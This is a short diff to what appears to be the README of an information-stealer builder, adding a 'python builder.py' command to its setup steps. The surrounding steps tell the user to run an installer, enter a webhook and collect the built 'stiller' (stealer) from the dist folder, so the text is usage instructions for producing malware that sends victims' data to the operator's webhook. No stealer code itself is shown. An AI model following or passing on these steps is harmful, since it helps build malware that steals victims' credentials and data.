@@ -12,6 +12,9 @@
 python install.py
 ```
 ## 3) open builder.py 
+```
+python builder.py
+```
 ## 4) enter your webhook and wait 
 ## your stiller will be in the dist folder
 
